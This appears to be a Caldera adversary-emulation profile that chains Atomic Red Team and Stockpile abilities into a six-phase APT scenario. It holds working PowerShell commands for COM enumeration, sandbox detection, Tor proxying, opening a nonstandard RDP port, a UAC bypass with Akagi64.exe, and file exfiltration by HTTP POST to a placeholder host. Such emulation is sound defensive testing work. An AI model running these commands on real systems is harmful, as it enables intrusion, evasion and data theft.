adversary_id: custom_adversary_profile__None__Survey_Paper_APT_Attack_Six_Phases__2023-10-19-22_43_09
name: Custom Adversary Profile
description: [['atomic__reconnaissance'], ['atomic__initial_access'], ['stockpile__command-and-control', 'atomic__command-and-control'], ['stockpile__lateral-movement', 'atomic__lateral-movement'], ['stockpile__privilege_escalation', 'atomic__privilege_escalation'], ['stockpile__exfiltration', 'atomic__exfiltration']]
atomic_ordering:
- afe32d76ebb32d20d0b43707bf271beb # ('afe32d76ebb32d20d0b43707bf271beb', 'None', 'validate_me') ; {'description': 'This test is designed to enumerate the COM objects listed in HKCR, then output their methods and CLSIDs to a text file.\nAn adversary could then use this information to identify COM objects that might be vulnerable to abuse, such as using them to spawn arbitrary processes. \nSee: https://www.mandiant.com/resources/hunting-com-objects', 'tactic': 'reconnaissance', 'technique': {'attack_id': 'T1592.002', 'name': 'Gather Victim Host Information: Software'}, 'platforms': {'windows': {'psh': {'cleanup': 'remove-item $env:temp\\T1592.002Test1.txt -force -erroraction silentlycontinue; remove-item $env:temp\\clsids.txt -force -erroraction silentlycontinue', 'command': 'New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR; Get-ChildItem -Path HKCR:\\CLSID -Name | Select -Skip 1 > $env:temp\\clsids.txt; ForEach($CLSID in Get-Content "$env:temp\\clsids.txt"); {try{write-output "$($Position)-$($CLSID)"; write-output "------------"| out-file $env:temp\\T1592.002Test1.txt -append; write-output $($CLSID)| out-file $env:temp\\T1592.002Test1.txt -append; $handle=[activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID)); $handle | get-member -erroraction silentlycontinue | out-file $env:temp\\T1592.002Test1.txt -append; $position += 1} catch{}}', 'parsers': {'plugins.atomic.app.parsers.atomic_powershell': [{'source': 'validate_me'}]}, 'payloads': []}}}, 'id__dependence__fact': ['afe32d76ebb32d20d0b43707bf271beb', 'None', 'validate_me'], 'plugin': 'atomic'}
- 64ccf7cd4358a0540ab51c8015c1b744 # ('64ccf7cd4358a0540ab51c8015c1b744', 'None', 'validate_me') ; {'description': 'Windows Management Instrumentation(WMI) objects contain system information which helps to detect virtualization. This test will get the model and manufacturer of the machine to determine if it is a virtual machine, such as through VMware or VirtualBox. \n', 'tactic': 'multiple', 'technique': {'attack_id': 'T1497.001', 'name': 'Virtualization/Sandbox Evasion: System Checks'}, 'platforms': {'windows': {'psh': {'cleanup': '', 'command': '$Manufacturer = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty "Manufacturer"; $Model = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty "Model"; if((($Manufacturer.ToLower() -eq "microsoft corporation") -and ($Model.ToLower().contains("virtual"))) -or ($Manufacturer.ToLower().contains("vmware")) -or ($Model.ToLower() -eq "virtualbox")) {write-host "Virtualization environment detected!"} else {write-host "No virtualization environment detected!"}', 'parsers': {'plugins.atomic.app.parsers.atomic_powershell': [{'source': 'validate_me'}]}, 'payloads': []}}}, 'id__dependence__fact': ['64ccf7cd4358a0540ab51c8015c1b744', 'None', 'validate_me'], 'plugin': 'atomic'}
- 5d2c642587b75f15b6cdf55552aab67a # ('5d2c642587b75f15b6cdf55552aab67a', 'None', 'validate_me') ; {'description': 'This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.\nUpon successful execution, the tor proxy will be launched, run for 60 seconds, and then exit. \n', 'tactic': 'command-and-control', 'technique': {'attack_id': 'T1090.003', 'name': 'Proxy: Multi-hop Proxy'}, 'platforms': {'windows': {'psh': {'cleanup': '', 'command': 'invoke-expression \'cmd /c start powershell -Command {cmd /c $env:temp\\tor\\Tor\\tor.exe}\'; sleep -s 60; stop-process -name "tor" | out-null', 'parsers': {'plugins.atomic.app.parsers.atomic_powershell': [{'source': 'validate_me'}]}, 'payloads': []}}}, 'id__dependence__fact': ['5d2c642587b75f15b6cdf55552aab67a', 'None', 'validate_me'], 'plugin': 'atomic'}
- 0dceba0336f08525bbd06a05c7b4e671 # ('0dceba0336f08525bbd06a05c7b4e671', 'None', 'validate_me') ; {'description': 'Changing RDP Port to Non Standard Port via Remote Desktop Application over Powershell\n', 'tactic': 'lateral-movement', 'technique': {'attack_id': 'T1021.001', 'name': 'Remote Services: Remote Desktop Protocol'}, 'platforms': {'windows': {'psh': {'cleanup': 'Set-ItemProperty -Path \'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\' -name "PortNumber" -Value 3389; Remove-NetFirewallRule -DisplayName "RDPPORTLatest-TCP-In" -ErrorAction ignore', 'command': 'Set-ItemProperty -Path \'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\' -name "PortNumber" -Value 4489; New-NetFirewallRule -DisplayName \'RDPPORTLatest-TCP-In\' -Profile \'Public\' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4489', 'parsers': {'plugins.atomic.app.parsers.atomic_powershell': [{'source': 'validate_me'}]}, 'payloads': []}}}, 'id__dependence__fact': ['0dceba0336f08525bbd06a05c7b4e671', 'None', 'validate_me'], 'plugin': 'atomic'}
- 95ad5d69-563e-477b-802b-4855bfb3be09 # ('95ad5d69-563e-477b-802b-4855bfb3be09', 'None', 'None') ; {'description': 'Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe', 'tactic': 'privilege-escalation', 'technique': {'attack_id': 'T1548.002', 'name': 'Abuse Elevation Control Mechanism: Bypass User Access Control'}, 'platforms': {'windows': {'cmd,psh': {'command': '.\\Akagi64.exe 30 C:\\Windows\\System32\\cmd.exe\n', 'payloads': ['Akagi64.exe']}}}, 'id__dependence__fact': ['95ad5d69-563e-477b-802b-4855bfb3be09', 'None', 'None'], 'plugin': 'stockpile'}
- 2e4b17949c4163f1cefec2e7fbee3e2b # ('2e4b17949c4163f1cefec2e7fbee3e2b', 'None', 'validate_me') ; {'description': 'Exfiltration of specified file over HTTP.\nUpon successful execution, powershell will invoke web request using POST method to exfiltrate notepad.exe to a remote address (default http://127.0.0.1). Results will be via stdout.\n', 'tactic': 'exfiltration', 'technique': {'attack_id': 'T1048.003', 'name': 'Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol'}, 'platforms': {'windows': {'psh': {'cleanup': '', 'command': '$content = Get-Content C:\\Windows\\System32\\notepad.exe; Invoke-WebRequest -Uri http://127.0.0.1 -Method POST -Body $content', 'parsers': {'plugins.atomic.app.parsers.atomic_powershell': [{'source': 'validate_me'}]}, 'payloads': []}}}, 'id__dependence__fact': ['2e4b17949c4163f1cefec2e7fbee3e2b', 'None', 'validate_me'], 'plugin': 'atomic'}
objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
tags: []